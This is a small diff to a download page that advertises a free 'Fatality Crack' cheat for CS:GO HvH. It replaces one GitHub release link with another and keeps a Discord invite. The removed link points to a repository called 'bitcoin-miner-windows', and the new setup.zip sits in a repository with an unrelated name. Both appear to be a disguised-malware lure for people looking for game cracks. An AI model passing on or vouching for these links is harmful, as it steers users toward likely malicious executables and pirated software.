@@ -10,7 +10,7 @@ Fatality Crack | Csgo HvH
 
 # Fatality Crack Csgo HvH Free2023 Download Windows Install Now for Window
 
-<a href='https://github.com/suellenoliveiras/bitcoin-miner-windows/releases/download/Bitcoin/Installer.zip'>Download here</a><br>
+<a href='https://github.com/ThetanMetacadeAxieInfinity/Fatality-Crack-Csgo-HvH-Live/releases/download/csgo/setup.zip'>Download here</a><br>
 <a href="https://discord.gg/yWcTb9BX">Discord Chat </a>
 ## Description
 
